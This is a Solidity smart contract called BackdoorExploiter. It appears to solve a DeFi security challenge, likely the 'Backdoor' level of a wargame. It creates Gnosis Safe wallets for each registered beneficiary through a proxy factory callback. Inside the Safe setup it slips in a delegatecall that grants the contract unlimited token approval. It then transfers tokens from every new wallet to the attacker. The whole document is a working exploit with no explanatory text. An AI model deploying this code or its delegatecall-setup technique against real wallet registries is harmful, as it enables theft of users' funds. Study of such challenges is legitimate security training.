// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

interface IGnosisSafeProxyFactory {
    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) external returns (GnosisSafeProxy proxy);
}

contract BackdoorExploiter {

    address private proxyFactory;
    address private singleton;
    address private callbackAddress;
    address private owner;
    address private token;
    uint256 private amount = 10 * 10**18;

    constructor(
        address _proxyFactory, 
        address _singleton, 
        address _callbackAddress, 
        address _token
    ) {
        proxyFactory = _proxyFactory;
        singleton = _singleton;
        callbackAddress = _callbackAddress;
        owner = msg.sender;
        token = _token;
    }

    // @dev ERC20 approve call, used in delegatecall
    function delegateApprove(address _spender, address _token) external {
        IERC20(_token).approve(_spender, type(uint256).max);
    }

    // @dev run exploit
    function runExploit(address[] memory _owners, uint256 _threshold) public {
        address[] memory _owner = new address[](1);

        for (uint256 i=0; i<_owners.length; i++) {

            _owner[0] = _owners[i];

            bytes memory _initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)", 
                _owner,
                _threshold,
                address(this),
                abi.encodeWithSelector(
                    BackdoorExploiter.delegateApprove.selector, 
                    address(this), 
                    token
                ),
                address(0),
                address(0),
                0,
                address(0)
            );

            address _proxy = address(
                IGnosisSafeProxyFactory(proxyFactory)
                    .createProxyWithCallback(
                        singleton,
                        _initializer,
                        0,
                        IProxyCreationCallback(callbackAddress)
                    )
                );

            IERC20(token).transferFrom(_proxy, owner, amount);
        }
    }

}